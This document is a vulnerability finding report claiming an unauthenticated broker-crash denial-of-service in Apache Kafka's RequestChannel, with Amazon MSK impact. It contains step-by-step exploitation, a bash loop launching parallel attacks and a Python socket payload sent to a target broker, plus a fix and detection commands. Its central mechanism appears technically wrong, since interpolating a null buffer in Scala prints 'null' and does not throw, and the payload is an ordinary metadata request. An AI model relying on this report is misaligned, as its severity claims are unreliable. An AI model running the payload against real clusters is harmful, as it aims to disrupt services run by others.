# FINDING-008: RequestChannel NULL Dereference After Buffer Release → Broker Crash

## Metadata

| Field | Value |
|-------|-------|
| Finding ID | FINDING-008 |
| Target | `apache/kafka` |
| Component | `RequestChannel` |
| Source File | `core/src/main/scala/kafka/network/RequestChannel.scala` |
| Approximate Lines | 52 (`buffer` field), 65 (initial parse), 78–80 (conditional release), 202 (`toString`), 227–235 (`releaseBuffer`) |
| Category | Remote Denial of Service — Broker Thread Crash |
| CVSS v3.1 Score | **7.5 HIGH** |
| CVSS v3.1 Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| CVSS Breakdown | ISCBase=0.5600, ISC=3.595, Exploit=3.887, Score=Roundup(7.482)=7.5 |
| CWE | CWE-476: NULL Pointer Dereference |
| Requires Auth | NONE — any network client can send requests to the broker |
| MSK Affected | YES — MSK brokers run standard Kafka with default thread pool sizes |

## Summary

In Kafka's `RequestChannel`, requests for API keys where `requiresDelayedAllocation == false` have their `ByteBuffer` released immediately after parsing (set to `null`). Subsequent error handling code paths that call `request.toString()` or access `buffer` directly trigger a `NullPointerException` on the broker's I/O handler thread, crashing that thread. Repeated from multiple connections, this exhausts the broker's request handler thread pool, suspending all request processing.

## Vulnerable Code (verbatim)

```scala
// RequestChannel.scala

// Line 52: buffer is @volatile — can be set to null
@volatile var buffer: ByteBuffer

// Line 65: buffer parsed and consumed — body available in bodyAndSize
private val bodyAndSize: RequestAndSize = context.parseRequest(buffer)

// Lines 78-80: Early release for non-delayed-allocation API keys
if (!header.apiKey.requiresDelayedAllocation) {
  releaseBuffer()     // sets buffer = null for these API keys
}

// Lines 227-235: releaseBuffer implementation
def releaseBuffer(): Unit = {
  envelope match {
    case Some(request) =>
      request.releaseBuffer()
    case None =>
      if (buffer != null) {        // only guards against double-release
        memoryPool.release(buffer)
        buffer = null              // NULL ASSIGNMENT
      }
  }
}

// Line 202: toString — accesses buffer AFTER possible null assignment
override def toString: String = {
  s"Request(processor=$processor, " +
  s"connectionId=${context.connectionId}, " +
  s"session=${context.principal}, " +
  s"listenerName=${context.listenerName}, " +
  s"securityProtocol=${context.securityProtocol}, " +
  s"buffer=$buffer, " +    // NullPointerException if buffer was released
  s"startTimeNanos=$startTimeNanos)"
}
```

## Root Cause

The guard in `releaseBuffer()` (`if (buffer != null)`) protects only against double-release — it does not prevent post-release access by other code paths. `toString()` is called by error logging and exception handlers throughout the request processing pipeline. For API keys with `requiresDelayedAllocation = false`, the buffer is nulled before the error path runs, so `toString()` triggers a NPE. Since Scala's string interpolation calls `toString` implicitly, this can be triggered anywhere the request object is interpolated into a log message.

## Attack Prerequisites

- Network access to the Kafka broker on any listener port (9092, 9093, 9094, 9098)
- No authentication required — the NPE is triggered before SASL authentication for some API keys (e.g., `API_VERSIONS` which requires no auth)
- Knowledge of which API keys trigger the early buffer release path

## Step-by-Step Exploitation

1. Identify target API keys (those where `requiresDelayedAllocation == false`):
   - API key 2: LIST_OFFSETS
   - API key 3: METADATA
   - API key 8: OFFSET_COMMIT
   - API key 9: OFFSET_FETCH
   - API key 18: API_VERSIONS
2. Craft a structurally valid request for one of these API keys that triggers an error path (e.g., METADATA request for a topic that doesn't exist)
3. Send from multiple simultaneous connections to exhaust the thread pool:
   ```bash
   for i in $(seq 1 16); do
     python3 payloads/finding-008-null-deref-request.py TARGET_HOST 9092 &
   done
   wait
   ```
4. Monitor broker logs for `NullPointerException` in `kafka.network.RequestChannel`

## Payload

See `payloads/finding-008-null-deref-request.py`.

```python
import socket, struct

def build_metadata_request(nonexistent_topic: str) -> bytes:
    """METADATA request (api_key=3, requiresDelayedAllocation=false) for nonexistent topic."""
    api_key = 3
    api_version = 1
    correlation_id = 1
    client_id = "null-deref-probe"

    header = (
        struct.pack(">h", api_key) +
        struct.pack(">h", api_version) +
        struct.pack(">i", correlation_id) +
        struct.pack(">h", len(client_id)) + client_id.encode()
    )
    topic_bytes = nonexistent_topic.encode()
    body = struct.pack(">i", 1) + struct.pack(">h", len(topic_bytes)) + topic_bytes
    payload = header + body
    return struct.pack(">i", len(payload)) + payload

with socket.create_connection(("TARGET_HOST", 9092), timeout=5) as s:
    s.sendall(build_metadata_request("nonexistent-crash-trigger-12345"))
    resp = s.recv(4096)
    print(f"Response: {resp[:16].hex()}")
```

## Expected Outcome

On a vulnerable broker: broker logs show `NullPointerException` in `kafka.network.RequestChannel.toString` or `kafka.network.RequestChannel.Request`. After 8–16 coordinated connections, the broker's request handler thread pool is exhausted and it stops processing all requests.

## Amazon MSK Specific Impact

- **MSK Default Thread Pool:** MSK brokers run with default `num.io.threads` (8) and `num.network.threads` (3) unless overridden. 8–16 coordinated requests can suspend all request processing
- **No authentication required:** The NPE can be triggered before SASL handshake for `API_VERSIONS` requests — completely unauthenticated
- **MSK broker restart:** AWS MSK automatically restarts brokers on health check failures, but this takes 60–180 seconds. During this window, all producers and consumers served by the affected broker are disconnected
- **Multi-broker resilience:** A coordinated attack against all brokers in the cluster simultaneously can cause full cluster outage

## Proposed Fix

Guard `buffer` access in `toString()` and all post-release code paths:

```scala
// In toString():
s"buffer=${Option(buffer).map(_.toString).getOrElse("<released>")}"
```

Or use `Option[ByteBuffer]` field type to make the nullable nature explicit and enforce null checks at the type level.

Additionally, apply bounds checking on error log paths that interpolate request objects to avoid triggering `toString` after release.

## Detection

- **Broker logs:** `grep -i "NullPointerException" /var/log/kafka/kafka.log | grep RequestChannel`
- **JMX metric:** `kafka.network:type=RequestChannel,name=RequestQueueSize` suddenly drops to 0 without corresponding throughput — indicates handler thread crash
- **MSK CloudWatch:** `RequestHandlerAvgIdlePercent` near 0% combined with low `MessagesInPerSec` indicates thread pool exhaustion
